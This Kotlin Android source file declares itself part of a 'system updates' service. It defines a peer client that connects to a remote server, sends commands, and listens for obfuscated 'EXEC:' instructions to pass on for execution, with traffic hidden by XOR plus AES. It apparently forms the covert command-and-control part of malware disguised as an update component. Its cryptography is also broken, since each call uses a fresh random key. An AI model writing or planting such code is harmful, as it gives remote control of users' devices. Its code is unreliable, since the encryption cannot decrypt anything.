package com.system.updates.services

import android.util.Base64
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.Socket
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class P2PPeer(private val serverAddress: String, private val port: Int = 12345) {
    private var socket: Socket? = null
    private var reader: BufferedReader? = null
    private var writer: PrintWriter? = null
    private val r = SecureRandom()
    private val mask = byteArrayOf(0x5E, 0x6F, 0x70.toByte(), 0x81.toByte(), 0x92.toByte(), 0xA3.toByte(), 0xB4.toByte(), 0xC5.toByte())

    fun connect(): Boolean {
        return try {
            socket = Socket(serverAddress, port)
            reader = BufferedReader(InputStreamReader(socket!!.getInputStream()))
            writer = PrintWriter(socket!!.getOutputStream(), true)
            sendMessage("PING")
            val response = reader!!.readLine()
            response == decrypt("PONG")
        } catch (e: Exception) {
            false
        }
    }

    fun sendCommand(cmd: String): Boolean {
        return try {
            sendMessage("CMD:$cmd")
            true
        } catch (e: Exception) {
            false
        }
    }

    fun listenForBroadcast(listener: (String) -> Unit) {
        Thread {
            try {
                while (socket?.isConnected == true) {
                    val line = reader?.readLine() ?: break
                    val decrypted = decrypt(line)
                    if (decrypted.startsWith("EXEC:")) {
                        listener(decrypted.substring(5))
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }.start()
    }

    private fun sendMessage(msg: String) {
        writer?.println(encrypt(msg))
    }

    private fun xor(data: ByteArray): ByteArray {
        return data.mapIndexed { i, b -> (b.toInt() xor mask[i % mask.size].toInt() xor i).toByte() }.toByteArray()
    }

    private fun aesEnc(data: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { r.nextBytes(it) }
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.ENCRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return iv + c.doFinal(data)
    }

    private fun aesDec(enc: ByteArray, key: ByteArray): ByteArray {
        val c = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = enc.sliceArray(0..11)
        val ct = enc.sliceArray(12 until enc.size)
        val ks = SecretKeySpec(key, "AES")
        c.init(Cipher.DECRYPT_MODE, ks, GCMParameterSpec(128, iv))
        return c.doFinal(ct)
    }

    private fun encrypt(plain: String): String {
        val raw = plain.toByteArray()
        val x = xor(raw)
        val key = ByteArray(32).also { r.nextBytes(it) }
        val enc = aesEnc(x, key)
        return Base64.encodeToString(enc, Base64.NO_WRAP)
    }

    private fun decrypt(encrypted: String): String {
        val enc = Base64.decode(encrypted, Base64.NO_WRAP)
        val key = ByteArray(32).also { r.nextBytes(it) }
        val dec = aesDec(enc, key)
        val plain = xor(dec)
        return String(plain)
    }

    fun disconnect() {
        socket?.close()
    }
}